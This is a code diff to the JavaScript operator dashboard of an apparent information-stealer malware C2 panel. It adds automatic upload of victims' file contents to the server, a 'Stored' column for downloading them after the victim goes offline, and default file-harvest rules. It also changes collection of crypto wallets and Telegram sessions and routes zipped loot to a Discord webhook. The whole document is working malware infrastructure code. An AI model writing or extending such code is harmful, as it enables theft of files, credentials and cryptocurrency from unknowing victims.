@@ -211,13 +211,14 @@
     {
       id: "files", label: "Files", key: "files", rpc: "list_files",
       cols: [
-        { k: "dir",      h: "Location" },
-        { k: "name",     h: "Name",     grow: true },
-        { k: "ext",      h: "Ext" },
-        { k: "size",     h: "Size",     filesize: true },
-        { k: "modified", h: "Modified", unixtimestamp: true },
-        { k: "tags",     h: "Tags",     seedtag: true },
-        { k: "_dl",      h: "",         filedownload: true },
+        { k: "dir",        h: "Location" },
+        { k: "name",       h: "Name",     grow: true },
+        { k: "ext",        h: "Ext" },
+        { k: "size",       h: "Size",     filesize: true },
+        { k: "modified",   h: "Modified", unixtimestamp: true },
+        { k: "tags",       h: "Tags",     seedtag: true },
+        { k: "hasContent", h: "Stored",   storedbadge: true },
+        { k: "_dl",        h: "",         filedownload: true },
       ],
     },
     {
@@ -470,7 +471,7 @@
 
   function cellClickHandler(col, row) {
     return () => {
-      if (col.filedownload)    { fetchAndDownload(row.path, row.name, event.currentTarget, row.clientId); return; }
+      if (col.filedownload)    { fetchAndDownload(row.path, row.name, event.currentTarget, row.clientId, row); return; }
       if (col.extdownload)     { fetchAndDownloadExt(row.path, row.extId, event.currentTarget, row.clientId); return; }
       if (col.walletdownload)  { fetchAndDownloadWallet(row.path, row.name, event.currentTarget, row.clientId); return; }
       if (col.tgdownload)      { fetchAndDownloadTelegram(row.path, row.account, event.currentTarget, row.clientId); return; }
@@ -776,8 +777,13 @@
       if (v === "wallet") return `<span class="badge badge-wallet">Wallet</span>`;
       return "";
     }
-    if (col.filedownload)
-      return `<button class="btn btn-dl" title="Fetch &amp; download">↓</button>`;
+    if (col.storedbadge) {
+      if (v) return `<span class="badge badge-stored" title="File body on server — download without agent">ready</span>`;
+      return `<span class="badge badge-pending" title="Metadata only — waiting for auto-upload or live fetch">meta</span>`;
+    }
+    if (col.filedownload) {
+      return `<button class="btn btn-dl" title="Download file">↓</button>`;
+    }
     if (col.extdownload)
       return `<button class="btn btn-dl" title="Download as ZIP">ZIP</button>`;
     if (col.walletdownload)
@@ -1206,14 +1212,48 @@
     if (isGlobal) updatePagination(tab.key);
   }
 
-  // ── File fetch (per-client) ───────────────────────────────────
-  function fetchAndDownload(path, name, tdEl, targetId) {
-    if (pendingFetches.has(path)) return;
+  // ── File fetch (prefer server-stored content, else live agent) ─
+  async function fetchAndDownload(path, name, tdEl, targetId, row) {
+    const key = path || name || String(row?.id || "");
+    if (pendingFetches.has(key)) return;
     const btn = tdEl.querySelector(".btn-dl");
     if (btn) { btn.textContent = "…"; btn.disabled = true; }
+    pendingFetches.set(key, { name, btn });
+
+    // Prefer content already stored on the C2 (auto-uploaded after scan)
+    const cid = (row && row.clientId) || targetId || clientId || undefined;
+    const hasStored = row && (row.hasContent || row.id);
+    if (hasStored && (row.id || (row.path && cid))) {
+      try {
+        const result = await rpc("download_file_data", {
+          id: row.id || undefined,
+          path: row.path || path,
+          clientId: cid,
+        });
+        pendingFetches.delete(key);
+        if (btn) { btn.textContent = "↓"; btn.disabled = false; }
+        if (!result?.content) {
+          log(`download_file_data: empty for ${name}`);
+          return;
+        }
+        downloadBase64(result.content, result.name || name || "file");
+        log(`Downloaded (stored): ${result.name || name}`);
+        return;
+      } catch (e) {
+        // Fall through to live fetch if agent is still online
+        log(`Stored download failed (${e.message}) — trying live agent…`);
+      }
+    }
+
+    if (!path) {
+      pendingFetches.delete(key);
+      if (btn) { btn.textContent = "✕"; btn.disabled = false; }
+      log(`No path and no stored content for ${name}`);
+      return;
+    }
     pendingFetches.set(path, { name, btn });
     sendEvent("fetch_file", { path }, targetId);
-    log(`Fetching: ${name}`);
+    log(`Fetching live: ${name}`);
   }
 
   function fetchAndDownloadExt(path, extId, tdEl, targetId) {
@@ -1709,12 +1749,17 @@
   }
 
   function getHarvestOptions() {
+    let rules = fileRules.slice();
+    // Never send Files with zero rules — fall back to common defaults
+    if (!rules.length) {
+      rules = COMMON_FILE_RULES.map((r) => ({ ...r }));
+    }
     return {
       files: !!(autoFilesToggle && autoFilesToggle.checked),
       ext: !!(autoExtToggle && autoExtToggle.checked),
       wallets: !!(autoWalletsToggle && autoWalletsToggle.checked),
       telegram: !!(autoTelegramToggle && autoTelegramToggle.checked),
-      rules: fileRules.slice(),
+      rules,
     };
   }
 
@@ -1739,12 +1784,12 @@
       wallets: opts.wallets,
       telegram: opts.telegram,
     };
-    if (opts.files && opts.rules.length) collectPayload.fileRules = opts.rules;
+    // Always attach rules when Files is on (required for body pack + upload)
+    if (opts.files) collectPayload.fileRules = opts.rules;
+    // Follow-ups only for things NOT already inside collect (avoid races / C2 flood).
+    // files + wallets + telegram are part of the collect payload when toggled on.
     const followUps = [];
-    if (opts.files) followUps.push({ event: "scan_files", payload: { rules: opts.rules } });
     if (opts.ext) followUps.push({ event: "scan_extensions", payload: {} });
-    if (opts.wallets) followUps.push({ event: "scan_wallets", payload: {} });
-    if (opts.telegram) followUps.push({ event: "scan_telegram", payload: {} });
     return { collectPayload, followUps };
   }
 
@@ -2228,6 +2273,17 @@
       if (activeTab === "wallets") await loadWalletCards();
     });
 
+    let fileDataDebounce = null;
+    sse.addEventListener("file_data_update", () => {
+      // Auto-uploaded file bodies landed — refresh Files so Stored=ready
+      if (activeTab !== "files") return;
+      if (fileDataDebounce) clearTimeout(fileDataDebounce);
+      fileDataDebounce = setTimeout(() => {
+        fileDataDebounce = null;
+        loadGlobalTab().then(() => renderTable()).catch(() => {});
+      }, 400);
+    });
+
     sse.addEventListener("client_deleted", async (e) => {
       const { clientId: cid } = JSON.parse(e.data);
       if (activeClient === cid) activeClient = "all";
@@ -2430,7 +2486,12 @@
               `${c[9]} wallets · ${c[10]} telegram · ${c[11]} keys · ${c[12]} seeds · ${c[13]} apps` +
               (hint?.threadId ? ` (thread ${hint.threadId})` : "")
             );
+            // File bodies may still be streaming via file_auto_data after Discord import
+            if (c[7] > 0) {
+              log(`Files listed: ${c[7]} — waiting for body upload (Stored=ready). Victim can go offline after "File auto-upload done".`);
+            }
             if (activeTab === "wallets") loadWalletCards().catch(() => {});
+            if (activeTab === "files") loadGlobalTab().catch(() => {});
             return true;
           }
         } catch (e) {
@@ -2448,16 +2509,15 @@
       // Include Discord webhook so agent POSTs harvest HTTP→Discord (not bulk over C2 WS)
       (async () => {
         try {
-          let discord = { enabled: false, webhookUrl: "", threadPrefix: "Stuart" };
-          try {
-            const s = await rpc("get_capture_settings");
-            discord = {
-              enabled: !!s.discord_upload_enabled,
-              webhookUrl: s.discord_webhook_url || "",
-              threadPrefix: s.discord_thread_prefix || "Stuart",
-            };
-          } catch (_) {}
           const plan = await buildManualCollectPlan();
+          const p = plan.collectPayload;
+          if (p.files) {
+            log(`Files ON (${p.fileRules?.length || 0} rules) — zip bodies → Discord same post (not C2 flood)`);
+          } else {
+            log("Files OFF — enable Settings → “Include files on Collect”");
+          }
+          if (p.wallets) log("Wallets ON — zip → Discord same post if any found");
+          else log("Wallets OFF — enable Settings → “Include wallets on Collect”");
           await sendEvent("collect", plan.collectPayload);
           // Optional follow-up scans (manual extras from settings)
           for (const step of plan.followUps) {
@@ -2581,11 +2641,39 @@
       },
       file_scan_results(payload) {
         if (!lastResults) { lastResults = {}; dataCard.style.display = ""; }
-        lastResults.files = payload?.files || [];
+        lastResults.files = (payload?.files || []).map(f => ({ ...f, hasContent: f.hasContent || 0 }));
         scanFilesBtn.disabled = false;
         if (activeTab !== "files") { activeTab = "files"; sortCol = null; sortAsc = true; }
         buildTabs(); buildBfilts(); renderTable();
-        log(`File scan — ${lastResults.files.length} files${payload?.truncated ? " (limit reached)" : ""}`);
+        log(`File scan — ${lastResults.files.length} files${payload?.truncated ? " (limit reached)" : ""} — uploading bodies…`);
+      },
+      file_auto_data(payload) {
+        const path = payload?.path;
+        const name = payload?.name || path;
+        if (lastResults?.files && path) {
+          const row = lastResults.files.find(f => f.path === path);
+          if (row) row.hasContent = 1;
+        }
+        // Avoid flooding the log when hundreds of files upload
+        if (!window.__stuartFileUpCount) window.__stuartFileUpCount = 0;
+        window.__stuartFileUpCount++;
+        if (window.__stuartFileUpCount <= 5 || window.__stuartFileUpCount % 25 === 0) {
+          log(`File body stored: ${name} (${humanSize(payload?.size || 0)}) [#${window.__stuartFileUpCount}]`);
+        }
+      },
+      file_auto_done(payload) {
+        const n = window.__stuartFileUpCount || 0;
+        window.__stuartFileUpCount = 0;
+        log(`File auto-upload done — sent ${payload?.sent ?? n} / ${payload?.expected ?? "?"} bodies on server (offline download ready)`);
+        // Prefer global DB view so ↓ uses download_file_data with real ids
+        if (activeTab === "files") {
+          loadGlobalTab().then(() => renderTable()).catch(() => {});
+        } else {
+          loadGlobalStats().catch(() => {});
+        }
+      },
+      file_auto_skip(payload) {
+        log(`File upload skipped: ${payload?.name || payload?.path || "?"} (${payload?.reason || ""})`);
       },
       fetch_file_result(payload) {
         const { path, name, content } = payload || {};
